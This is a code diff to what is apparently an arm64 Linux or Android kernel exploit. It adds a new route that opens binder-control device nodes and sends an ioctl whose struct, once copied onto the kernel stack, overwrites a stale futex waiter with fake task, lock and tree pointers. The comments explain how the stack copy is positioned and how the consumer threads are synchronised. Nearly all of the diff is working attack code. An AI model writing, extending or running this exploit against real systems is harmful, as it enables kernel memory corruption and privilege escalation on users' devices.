@@ -4,6 +4,7 @@
 #include <netinet/in.h>
 #include <netinet/tcp.h>
 #include <sys/prctl.h>
+#include <sys/ioctl.h>
 #ifndef PR_SET_MM
 #define PR_SET_MM 35
 #endif
@@ -832,6 +833,91 @@ void do_prctl_mm_map_route(void) {
   atomic_store(&punch_consume_go, 0);
   while (atomic_load(&consumer_inflight))
     __asm__ volatile("yield" ::: "memory");
+  if (atomic_load(&consumer_success) > 0) {
+    route_last_step = 0;
+    route_last_errno = 0;
+  }
+}
+
+/* ioctl transport: a file_operations unlocked_ioctl handler copies a
+ * user struct onto its kernel stack before the handler looks at it. The ioctl
+ * syscall reaches the handler through one blr (security_file_ioctl then
+ * f_op->unlocked_ioctl), so the handler's own frame alone positions the copy
+ * relative to the syscall entry, and on a kernel whose futex waiter sits
+ * shallow the copy can land on the stale waiter's task/lock/pi_tree words.
+ *
+ * The entry carries the command and the buffer geometry; ioctl_node names the
+ * dev node to open. The stamp fills the whole struct, so the copy zeroes the
+ * waiter and plants the fake page pointers just like the mcast arm. */
+static const char *const ioctl_fallback_nodes[] = {
+  "/dev/binderfs/binder-control",
+  "/dev/binder/binder-control",
+  "/dev/binderfs",
+  NULL,
+};
+
+void do_ioctl_fake_lock_route(void) {
+  size_t size = active_offsets ? active_offsets->ioctl_buf_size : 0;
+  if (!active_offsets || !ioctl_geometry_ok_off(active_offsets)) {
+    route_last_step = 80;
+    route_last_errno = 0;
+    return;
+  }
+
+  /* try the named node first, then the fallbacks */
+  int fd = -1;
+  const char *opened = NULL;
+  if (active_offsets->ioctl_node) {
+    fd = open(active_offsets->ioctl_node, O_RDWR | O_CLOEXEC);
+    if (fd >= 0) opened = active_offsets->ioctl_node;
+  }
+  for (size_t i = 0; fd < 0 && ioctl_fallback_nodes[i]; i++) {
+    fd = open(ioctl_fallback_nodes[i], O_RDWR | O_CLOEXEC);
+    if (fd >= 0) opened = ioctl_fallback_nodes[i];
+  }
+  if (fd < 0) {
+    route_last_step = 81;
+    route_last_errno = errno;
+    pr_warning("ioctl route: no writable node (last errno=%d)\n", errno);
+    return;
+  }
+
+  /* The waiter base can sit before the buffer start (a handler that copies
+   * into the middle of its frame), so lay the waiter into a padded work buffer
+   * and hand the kernel the window the ioctl actually copies. */
+  int waiter_off = active_offsets->ioctl_waiter_off;
+  size_t pad = waiter_off < 0 ? (size_t)(-waiter_off) : 0;
+  unsigned char work[pad + size];
+  memset(work, 0, sizeof(work));
+  write_waiter_words(work, pad + (size_t)waiter_off, fake_parent, fake_right,
+                     fake_left, fake_task, fake_lock,
+                     (int)active_offsets->compact_waiter);
+  unsigned char *stamp = work + pad;
+  pr_info("ioctl route enter node=%s cmd=%#x size=%#x waiter_off=%#x "
+          "fake_lock=%016zx fake_task=%016zx\n",
+          opened, active_offsets->ioctl_cmd, active_offsets->ioctl_buf_size,
+          (unsigned)waiter_off, fake_lock, fake_task);
+
+  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
+  errno = 0;
+  int ret = ioctl(fd, active_offsets->ioctl_cmd, stamp);
+  route_last_step = 82; route_last_errno = errno;
+  pr_info("ioctl route ret=%d errno=%d\n", ret, errno);
+  /* The handler copies the struct before it validates its contents, so a
+   * nonzero ret that comes from the post-copy device work (e.g. a bad name in
+   * the copied struct) still means the waiter was stamped, exactly as the
+   * mcast arm arms after a failed setsockopt. A wrong node or command returns
+   * before the copy, so the message names both the node and the command for
+   * the next run to check. */
+  atomic_store(&punch_consume_go, 1);
+  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0;
+       spin++)
+    __asm__ volatile("yield" ::: "memory");
+  atomic_store(&punch_consume_go, 0);
+  while (atomic_load(&consumer_inflight))
+    __asm__ volatile("yield" ::: "memory");
+  close(fd);
   if (atomic_load(&consumer_success) > 0) {
     route_last_step = 0;
     route_last_errno = 0;
